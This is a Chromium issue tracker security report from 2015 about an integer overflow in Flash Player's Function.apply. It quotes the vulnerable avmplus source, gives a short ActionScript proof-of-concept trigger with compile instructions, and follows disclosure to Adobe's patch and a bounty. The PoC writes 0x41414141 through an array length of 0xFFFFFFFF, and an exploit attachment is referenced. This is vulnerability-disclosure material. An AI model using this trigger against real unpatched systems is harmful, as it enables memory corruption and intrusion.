# Security: Flash Player Integer Overflow in Function.apply

| Field | Value |
|-------|-------|
| **Issue ID** | [40081727](https://issues.chromium.org/issues/40081727) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-03-26 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

An integer overflow while calling Function.apply can lead to enter an ActionScript function without correctly validating the supplied arguments.

**VERSION**  

Chrome Version: 41.0.2272.101 stable, Flash 17.0.0.134  

Operating System: Win7 x64 SP1

**REPRODUCTION CASE**

From exec.cpp taken from the Crossbridge sources, available at <https://github.com/adobe-flash/crossbridge/blob/master/avmplus/core/exec.cpp>

944 // Specialized to be called from Function.apply().  

945 Atom BaseExecMgr::apply(MethodEnv\* env, Atom thisArg, ArrayObject \*a)  

946 {  

947 int32\_t argc = a->getLength();

...

966 // Tail call inhibited by local allocation/deallocation.  

967 MMgc::GC::AllocaAutoPtr \_atomv;  

968 Atom\* atomv = (Atom\*)avmStackAllocArray(core, \_atomv, (argc+1), sizeof(Atom)); //here if argc = 0xFFFFFFFF we get an integer overflow  

969 atomv[0] = thisArg;  

970 for (int32\_t i=0 ; i < argc ; i++ )  

971 atomv[i+1] = a->getUintProperty(i);  

972 return env->coerceEnter(argc, atomv);  

973 }

So the idea is to use the rest argument to get a working poc. For example:

```
public function myFunc(a0:ByteArray, a1:ByteArray, a2:ByteArray, a3:ByteArray, a4:ByteArray, a5:ByteArray, ... rest) {  
      
    try {a0.writeUnsignedInt(0x41414141)}catch (e) {}  
    try {a1.writeUnsignedInt(0x41414141)}catch (e) {}  
    try {a2.writeUnsignedInt(0x41414141)}catch (e) {}  
    try {a3.writeUnsignedInt(0x41414141)}catch (e) {}  
    try {a4.writeUnsignedInt(0x41414141)}catch (e) {}  
      
}  
public function XApplyPoc() {  
    var a:Array = new Array()  
     
    a.length = 0xFFFFFFFF  
    myFunc.apply(this, a)  
}  

```

Compile with mxmlc -target-player 15.0 -swf-version 25 XApplyPoc.as.

## Attachments

- [XApply.zip](attachments/XApply.zip) (application/zip, 2.2 KB)
- [XApplyExploit.zip](attachments/XApplyExploit.zip) (application/zip, 10.1 KB)

## Timeline

### bi...@gmail.com (2015-03-26)

Hopefully I can do a working exploit for that thing

### ts...@chromium.org (2015-03-26)

laforge@ - can you find someone at Adobe to take a look at this?


### la...@google.com (2015-03-26)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-03-26)

@tsepez: for any Flash bug, just assign it to me and I can deal with it.

### sc...@gmail.com (2015-03-26)

Deadline tracking via P0 bug: https://code.google.com/p/google-security-research/issues/detail?id=302

@biloulehibou: how will you stop the 0xFFFFFFFF-sized loop from doing a wild copy and crashing? Is the loop length, or the "a" pointer reloaded from the stack on each loop iteration? Some other trick?

### bi...@gmail.com (2015-03-27)

can I comment? :P

### bi...@gmail.com (2015-03-27)

Ok so here's my exploit for that thing. 
@scarybeast the argc is signed, thus we can skip the initialization!

### sc...@gmail.com (2015-03-27)

Adobe acknowledged and assigned PSIRT-3531 to track.

### sc...@gmail.com (2015-05-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-05-12)

https://helpx.adobe.com/security/products/flash-player/apsb15-09.html

### ti...@google.com (2015-08-17)

As discussed, reward should be paid this week.

### cl...@chromium.org (2015-08-18)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/470837?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081727)*
